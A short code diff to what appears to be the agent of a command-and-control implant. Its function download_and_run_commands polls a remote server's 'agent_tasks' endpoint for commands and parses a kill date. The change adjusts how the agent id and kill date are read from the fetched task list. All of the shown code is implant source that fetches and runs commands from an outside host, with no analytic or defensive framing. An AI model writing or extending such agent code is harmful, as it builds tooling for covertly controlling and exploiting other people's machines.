@@ -211,6 +211,7 @@ def download_and_run_commands():
     """
     if VERBOSE:
         print('[+] Checking for new tasks')
+    global agent_id
     try:
         # url = ('http://%s:8080/agent_tasks/%s' % SERVER_IP % agent_id)
         url = 'http://{0}:8080/agent_tasks/{1}'.format(SERVER_IP, agent_id)
@@ -225,6 +226,9 @@ def download_and_run_commands():
                 if command is '':
                     continue
                 if i == 0:
+                    agent_id = int(agent_id)
+                    continue
+                if i == 1:
                     global kill_date_string
                     kill_date_string = command
                     continue
